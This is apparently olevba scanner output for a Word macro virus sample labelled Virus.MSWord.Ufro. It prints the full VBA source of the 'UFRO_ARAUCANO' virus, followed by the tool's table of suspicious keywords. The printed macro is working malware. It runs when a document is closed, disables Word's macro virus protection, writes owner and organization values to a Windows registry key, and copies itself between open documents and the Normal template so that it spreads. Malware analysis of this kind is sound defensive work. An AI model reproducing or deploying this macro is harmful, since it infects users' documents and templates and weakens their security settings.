olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ufro-ab0b9c1e4818e9c4f78960e9165704c3d809a32c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ufro-ab0b9c1e4818e9c4f78960e9165704c3d809a32c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Nombre del virus: UFRO_ARAUCANO
'Origen: Temuco - Chile

Private Sub Document_Close()
On Error GoTo ARAUCANO
Options.VirusProtection = False
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Temuco Virus Ufro"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "UFRO_ARAUCANO"
If Month(Now()) = 10 And Day(Now()) = 10 Then MsgBox "UFRO_ARAUCANO", vbInformation, "INFORMACIÓN!!!"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "adk-tvu"
    .Execute
Randomize
If Int(3 * Rnd) = 1 Then
   UFRO_ARAUCANO
End If
ARAUCANO:
End With
End Sub
 Private Sub UFRO_ARAUCANO()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 3, lineofcode
     Next I
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 3, lineofcode
    Next I
    NormalTemplate.Save
End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

